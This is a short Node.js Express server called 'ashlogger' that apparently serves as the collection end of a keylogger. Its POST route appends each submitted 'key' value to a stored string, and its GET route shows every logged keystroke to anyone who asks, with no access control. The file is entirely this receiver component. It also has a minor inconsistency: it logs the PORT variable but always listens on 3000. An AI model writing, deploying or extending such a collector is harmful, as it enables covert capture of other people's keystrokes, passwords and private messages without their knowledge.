var express = require('express')
var bodyParser = require('body-parser')
var PORT = process.env.PORT || 3000
var app = express()

var characters = ''

app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())

app.get('/', function (req, res) {
  res.send(`ashlogger: ${characters}`)
})

app.post('/', function (req, res) {
  characters += req.body.key
  res.send(`sucessfully logged key`)
})

app.listen(3000)

console.log('ashlogger listening on port ', PORT);
